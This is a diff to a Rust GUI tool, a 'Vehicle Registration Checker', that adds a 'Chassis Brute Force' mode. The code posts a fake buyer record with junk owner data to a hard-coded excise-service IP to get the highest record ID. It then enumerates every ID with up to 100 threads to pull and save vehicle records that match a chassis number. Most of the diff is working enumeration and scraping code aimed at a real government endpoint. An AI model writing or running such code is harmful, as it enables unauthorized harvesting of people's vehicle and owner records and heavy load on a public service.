@@ -20,18 +20,26 @@ enum LogLevel {
     Warning,
 }
 
+#[derive(Clone, Copy, PartialEq)]
+enum AppTab {
+    DateRange,
+    ChassisBruteForce,
+}
+
 struct VehicleChecker {
     vehicle_no: String,
     start_date: String,
     end_date: String,
+    chassis_no: String,
+    current_tab: AppTab,
     num_threads: usize,
 
     is_running: Arc<AtomicBool>,
     record_found: Arc<AtomicBool>,
     logs: Arc<Mutex<Vec<LogEntry>>>,
     found_count: Arc<Mutex<usize>>,
-    checked_dates: Arc<Mutex<usize>>,
-    total_dates: Arc<Mutex<usize>>,
+    checked_items: Arc<Mutex<usize>>,
+    total_items: Arc<Mutex<usize>>,
 
     status_text: String,
     results_dir: PathBuf,
@@ -48,13 +56,15 @@ impl Default for VehicleChecker {
             vehicle_no: String::new(),
             start_date: "2000-01-01".to_string(),
             end_date: chrono::Local::now().format("%Y-%m-%d").to_string(),
+            chassis_no: String::new(),
+            current_tab: AppTab::DateRange,
             num_threads: 6,
             is_running: Arc::new(AtomicBool::new(false)),
             record_found: Arc::new(AtomicBool::new(false)),
             logs: Arc::new(Mutex::new(Vec::new())),
             found_count: Arc::new(Mutex::new(0)),
-            checked_dates: Arc::new(Mutex::new(0)),
-            total_dates: Arc::new(Mutex::new(0)),
+            checked_items: Arc::new(Mutex::new(0)),
+            total_items: Arc::new(Mutex::new(0)),
             status_text: "Ready".to_string(),
             results_dir,
         }
@@ -86,6 +96,201 @@ impl VehicleChecker {
     }
 
     fn start_checking(&mut self) {
+        if self.current_tab == AppTab::DateRange {
+            self.start_date_range_check();
+        } else {
+            self.start_chassis_bruteforce();
+        }
+    }
+
+    fn fetch_max_computer_id(&self) -> Result<u64, String> {
+        let client = reqwest::blocking::Client::builder()
+            .timeout(std::time::Duration::from_secs(15))
+            .build()
+            .map_err(|e| format!("Client build error: {}", e))?;
+
+        let payload = r#"{"buyer":{"ownerType":"ORGANIZATION","ntn":"","ownerName":"jack asssssssss","contactNumber":"03000000000","otherContactNumber":"","presentAddress":"jack assssss","presentAddressCity":"","permanentAddressCity":"","permanentAddress":"","presentAddressDistrict":"","permanentAddressDistrict":""},"purchaser":{"ownerType":"","ntn":"","ownerName":"","contactNumber":"","otherContactNumber":"","presentAddress":"","presentAddressCity":"","permanentAddressCity":"","permanentAddress":"","presentAddressDistrict":"","permanentAddressDistrict":""},"vehicle":{"taxpayerType":"","vehicleHirePurchaseAgreement":"","vehicleFirstTransfer":"","vehicleHirePurchaseParty":"","vehicleCategory":"","vehiclePurchaseType":"","vehicleBodyType":"","vehicleSeats":"","vehicleChasisNumber":"1234","vehicleEngineCapacity":"","vehicleColor":"","vehicleValue":"","vehicleEngineNumber":"","vehiclePurchaseDate":"","vehicleCommercialCategory":"","vehicleLadenWeight":"","vehicleUnLadenWeight":"","representativeCnic":"","representativeMobile":"","representativeFName":"","representativeName":""}}"#;
+
+        let response = client
+            .post("http://58.65.189.226:8080/etd-online-be/")
+            .header("User-Agent", "Mozilla/5.0")
+            .header("Content-Type", "application/json;charset=utf-8")
+            .body(payload)
+            .send()
+            .map_err(|e| format!("Request error: {}", e))?;
+
+        let text = response.text().map_err(|e| format!("Response parse error: {}", e))?;
+        
+        let mut max_id: Option<u64> = None;
+        if let Some(idx) = text.find("\"computerId\":") {
+            let id_str = text[idx + 13..].split(|c: char| !c.is_numeric()).find(|s| !s.is_empty());
+            if let Some(num_str) = id_str {
+                max_id = num_str.parse::<u64>().ok();
+            }
+        }
+        max_id.ok_or_else(|| format!("Could not extract max ID: {}", text))
+    }
+
+    fn start_chassis_bruteforce(&mut self) {
+        let chassis_no = self.chassis_no.trim().to_uppercase();
+
+        if chassis_no.is_empty() {
+            self.log("Please enter a chassis number".to_string(), LogLevel::Error);
+            return;
+        }
+
+        self.log("Fetching max computer ID...".to_string(), LogLevel::Info);
+        let max_id = match self.fetch_max_computer_id() {
+            Ok(id) => {
+                self.log(format!("Successfully fetched max ID: {}", id), LogLevel::Success);
+                id
+            }
+            Err(e) => {
+                self.log(e, LogLevel::Error);
+                return;
+            }
+        };
+
+        let total_items = max_id + 1;
+        let items_per_thread = total_items / self.num_threads as u64;
+        let remainder_items = total_items % self.num_threads as u64;
+
+        // Reset state
+        self.is_running.store(true, Ordering::SeqCst);
+        self.record_found.store(false, Ordering::SeqCst);
+        *self.found_count.lock().unwrap() = 0;
+        *self.checked_items.lock().unwrap() = 0;
+        *self.total_items.lock().unwrap() = total_items as usize;
+
+        self.log(format!("Starting check for chassis: {}", chassis_no), LogLevel::Info);
+        self.log(format!("ID Range: 0 to {}", max_id), LogLevel::Info);
+        self.log(format!("Total IDs to check: {}", total_items), LogLevel::Info);
+        self.log(format!("Threads: {}, ~{} IDs per thread", self.num_threads, items_per_thread), LogLevel::Info);
+        self.log("-".repeat(80), LogLevel::Info);
+
+        let results_dir = self.results_dir.clone();
+        let logs = Arc::clone(&self.logs);
+        let is_running = Arc::clone(&self.is_running);
+        let record_found = Arc::clone(&self.record_found);
+        let found_count = Arc::clone(&self.found_count);
+        let checked_items = Arc::clone(&self.checked_items);
+        let num_threads = self.num_threads;
+
+        thread::spawn(move || {
+            let mut handles = vec![];
+            let mut current_start = 0;
+
+            for i in 0..num_threads {
+                let thread_items = items_per_thread + if i < remainder_items as usize { 1 } else { 0 };
+                let thread_end = current_start + thread_items - 1;
+
+                let log_msg = format!("Thread {}: {} to {}", i + 1, current_start, thread_end);
+                Self::log_static(&logs, log_msg, LogLevel::Info);
+
+                let chassis = chassis_no.clone();
+                let logs_clone = Arc::clone(&logs);
+                let is_running_clone = Arc::clone(&is_running);
+                let record_found_clone = Arc::clone(&record_found);
+                let found_count_clone = Arc::clone(&found_count);
+                let checked_items_clone = Arc::clone(&checked_items);
+                let results_dir_clone = results_dir.clone();
+                let thread_id = i + 1;
+
+                let handle = thread::spawn(move || {
+                    Self::check_chassis_thread(
+                        chassis,
+                        current_start,
+                        thread_end,
+                        thread_id,
+                        logs_clone,
+                        is_running_clone,
+                        record_found_clone,
+                        found_count_clone,
+                        checked_items_clone,
+                        results_dir_clone,
+                    );
+                });
+
+                handles.push(handle);
+                current_start = thread_end + 1;
+            }
+
+            Self::log_static(&logs, "-".repeat(80), LogLevel::Info);
+
+            for handle in handles {
+                let _ = handle.join();
+            }
+
+            is_running.store(false, Ordering::SeqCst);
+        });
+    }
+
+    fn check_chassis_thread(
+        chassis_no: String,
+        start_id: u64,
+        end_id: u64,
+        thread_id: usize,
+        logs: Arc<Mutex<Vec<LogEntry>>>,
+        is_running: Arc<AtomicBool>,
+        record_found: Arc<AtomicBool>,
+        found_count: Arc<Mutex<usize>>,
+        checked_items: Arc<Mutex<usize>>,
+        results_dir: PathBuf,
+    ) {
+        let mut current_id = start_id;
+        let mut checked_count = 0;
+
+        let client = reqwest::blocking::Client::builder()
+            .timeout(std::time::Duration::from_secs(10))
+            .build()
+            .unwrap();
+
+        while current_id <= end_id && is_running.load(Ordering::SeqCst) && !record_found.load(Ordering::SeqCst) {
+            let payload = format!(r#"^{{"computerId":"{}","chasis":"{}"}}^"#, current_id, chassis_no).replace('^', "");
+            
+            let res = client.post("http://58.65.189.226:8080/etd-online-be/get.php")
+                .header("Content-Type", "application/json;charset=utf-8")
+                .body(payload)
+                .send();
+
+            match res {
+                Ok(response) => {
+                    checked_count += 1;
+                    if let Ok(mut count) = checked_items.lock() {
+                        *count += 1;
+                    }
+
+                    if response.status().is_success() {
+                        if let Ok(text) = response.text() {
+                            if text.len() > 10 && !text.contains("NO RECORD FOUND") && !text.contains("PLEASE CONTACT EXCISE") && !text.contains("null") && !text.trim().is_empty() {
+                                let msg = format!("Thread {}: *** RECORD FOUND *** - Chassis: {}, ID: {}", thread_id, chassis_no, current_id);
+                                Self::log_static(&logs, msg, LogLevel::Success);
+                                Self::save_response(&chassis_no, &current_id.to_string(), &text, thread_id, 200, &results_dir, &logs, &found_count);
+                                record_found.store(true, Ordering::SeqCst);
+                                break;
+                            }
+                        }
+                    } else if checked_count % 50 == 0 {
+                         let msg = format!("Thread {}: Checked {} IDs, currently at {} (HTTP {:?})", thread_id, checked_count, current_id, response.status());
+                         Self::log_static(&logs, msg, LogLevel::Info);
+                    }
+                }
+                Err(_e) => {
+                    // silently skip transient errors, maybe log occasionally
+                }
+            }
+
+            current_id += 1;
+        }
+
+        if record_found.load(Ordering::SeqCst) {
+            Self::log_static(&logs, format!("Thread {}: Stopped due to record found", thread_id), LogLevel::Warning);
+        } else {
+            Self::log_static(&logs, format!("Thread {}: Completed - Checked {} IDs", thread_id, checked_count), LogLevel::Warning);
+        }
+    }
+
+    fn start_date_range_check(&mut self) {
         let vehicle_no = self.vehicle_no.trim().to_uppercase();
         let start_date_str = self.start_date.trim();
         let end_date_str = self.end_date.trim();
@@ -141,7 +346,7 @@ impl VehicleChecker {
         let is_running = Arc::clone(&self.is_running);
         let record_found = Arc::clone(&self.record_found);
         let found_count = Arc::clone(&self.found_count);
-        let checked_dates = Arc::clone(&self.checked_dates);
+        let checked_dates = Arc::clone(&self.checked_items);
         let num_threads = self.num_threads;
 
         // Spawn threads
@@ -378,11 +583,11 @@ impl eframe::App for VehicleChecker {
         let is_running = self.is_running.load(Ordering::SeqCst);
         let record_found = self.record_found.load(Ordering::SeqCst);
         let found_count = *self.found_count.lock().unwrap();
-        let checked_dates = *self.checked_dates.lock().unwrap();
-        let total_dates = *self.total_dates.lock().unwrap();
+        let checked_items = *self.checked_items.lock().unwrap();
+        let total_items = *self.total_items.lock().unwrap();
 
-        let progress = if total_dates > 0 {
-            checked_dates as f32 / total_dates as f32
+        let progress = if total_items > 0 {
+            checked_items as f32 / total_items as f32
         } else {
             0.0
         };
@@ -392,11 +597,18 @@ impl eframe::App for VehicleChecker {
         } else if !is_running {
             self.status_text = "Ready".to_string();
         } else {
-            self.status_text = format!("Running... ({}/{})", checked_dates, total_dates);
+            self.status_text = format!("Running... ({}/{})", checked_items, total_items);
         }
 
         egui::CentralPanel::default().show(ctx, |ui| {
             ui.heading("Vehicle Registration Checker");
+            ui.add_space(10.0);
+
+            // Tabs
+            ui.horizontal(|ui| {
+                ui.selectable_value(&mut self.current_tab, AppTab::DateRange, "Check by Date Range");
+                ui.selectable_value(&mut self.current_tab, AppTab::ChassisBruteForce, "Check by Chassis Brute Force");
+            });
             ui.add_space(10.0);
 
             // Configuration - Centered and Full Width
@@ -410,24 +622,31 @@ impl eframe::App for VehicleChecker {
                     });
                     ui.add_space(10.0);
 
-                    ui.horizontal(|ui| {
-                        ui.label("Vehicle Registration No:");
-                        ui.add(egui::TextEdit::singleline(&mut self.vehicle_no).desired_width(200.0));
-                    });
+                    if self.current_tab == AppTab::DateRange {
+                        ui.horizontal(|ui| {
+                            ui.label("Vehicle Registration No:");
+                            ui.add(egui::TextEdit::singleline(&mut self.vehicle_no).desired_width(200.0));
+                        });
 
-                    ui.horizontal(|ui| {
-                        ui.label("Starting Date (YYYY-MM-DD):");
-                        ui.add(egui::TextEdit::singleline(&mut self.start_date).desired_width(200.0));
-                    });
+                        ui.horizontal(|ui| {
+                            ui.label("Starting Date (YYYY-MM-DD):");
+                            ui.add(egui::TextEdit::singleline(&mut self.start_date).desired_width(200.0));
+                        });
 
-                    ui.horizontal(|ui| {
-                        ui.label("Ending Date (YYYY-MM-DD):");
-                        ui.add(egui::TextEdit::singleline(&mut self.end_date).desired_width(200.0));
-                    });
+                        ui.horizontal(|ui| {
+                            ui.label("Ending Date (YYYY-MM-DD):");
+                            ui.add(egui::TextEdit::singleline(&mut self.end_date).desired_width(200.0));
+                        });
+                    } else {
+                        ui.horizontal(|ui| {
+                            ui.label("Chassis Number:");
+                            ui.add(egui::TextEdit::singleline(&mut self.chassis_no).desired_width(200.0));
+                        });
+                    }
 
                     ui.horizontal(|ui| {
                         ui.label("Number of Threads:");
-                        ui.add(egui::Slider::new(&mut self.num_threads, 1..=20));
+                        ui.add(egui::Slider::new(&mut self.num_threads, 1..=100));
                     });
 
                     ui.add_space(10.0);
@@ -476,7 +695,7 @@ impl eframe::App for VehicleChecker {
 
                     if is_running || progress > 0.0 {
                         let progress_text = format!("{:.1}% ({}/{})",
-                                                    progress * 100.0, checked_dates, total_dates);
+                                                    progress * 100.0, checked_items, total_items);
                         ui.add(
                             egui::ProgressBar::new(progress)
                             .show_percentage()
